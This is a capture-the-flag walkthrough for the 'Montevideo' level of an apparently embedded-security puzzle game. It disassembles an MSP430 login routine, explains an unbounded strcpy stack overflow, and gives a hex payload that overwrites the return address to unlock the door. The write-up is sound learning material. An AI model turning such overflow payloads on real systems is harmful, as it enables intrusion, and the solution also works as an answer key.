# Montevideo

Before even running the program on the debugger I started by inspecting `<login>` and trying to understand how this program differs from Whitehorse.

```asm
44f4 <login>
44f4:  3150 f0ff      add	#0xfff0, sp
44f8:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15
44fc:  b012 b045      call	#0x45b0 <puts>
4500:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504:  b012 b045      call	#0x45b0 <puts>
4508:  3e40 3000      mov	#0x30, r14
450c:  3f40 0024      mov	#0x2400, r15
4510:  b012 a045      call	#0x45a0 <getsn>
4514:  3e40 0024      mov	#0x2400, r14
4518:  0f41           mov	sp, r15
451a:  b012 dc45      call	#0x45dc <strcpy>
451e:  3d40 6400      mov	#0x64, r13
4522:  0e43           clr	r14
4524:  3f40 0024      mov	#0x2400, r15
4528:  b012 f045      call	#0x45f0 <memset>
452c:  0f41           mov	sp, r15
452e:  b012 4644      call	#0x4446 <conditional_unlock_door>
4532:  0f93           tst	r15
4534:  0324           jz	$+0x8 <login+0x48>
4536:  3f40 c544      mov	#0x44c5 "Access granted.", r15
453a:  023c           jmp	$+0x6 <login+0x4c>
453c:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
4540:  b012 b045      call	#0x45b0 <puts>
4544:  3150 1000      add	#0x10, sp
4548:  3041           ret
```

The first few lines are the same:

- make room on the stack (16 bytes) for the user input (remember, adding `#0xfff0` is the same as subtracting `#0x10`)
- prompt the user to enter password
- get user input for the password
  - pass `0x30` (i.e. 48 bytes) as the length of the buffer
  - input buffer in memory location `0x2400`

Then we see a call to `strcpy` to copy the input buffer at `0x2400` onto the stack pointer. Since `strcpy` will copy up to the null-terminating string, we should be able to craft the input so that we copy past the 16-byte space allocated on the stack and do something similar to what we did in [whitehorse](./06-whitehorse.md) where we overwrite the return memory address to jump to the unlock method.

When we enter `strcpy`, this is what the stack looks like:

```sh
> r sp
43ec 1e45 0000 0000 0000 0000 0000 0000 0000  .E..............
43fc 0000 3c44 3140 0044 1542 5c01 75f3 35d0  ..<D1@.D.B\.u.5.
```

The first word is the return address back to `<login>`, followed by 16-byte buffer which is the destination parameter of `strcpy`, followed by the return address from `<login>`. So we want to overwrite the value at address `43fe` (i.e `443c`) to point to `<INT>` similar to what we did in the [whitehorse](./06-whitehorse.md)` solution:

`a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5 + 4c45 + 3645 + 7f00`

**Solution: in HEX `a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a54c4536457f00`.**

```sh
> solve
a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a54c4536457f00
```
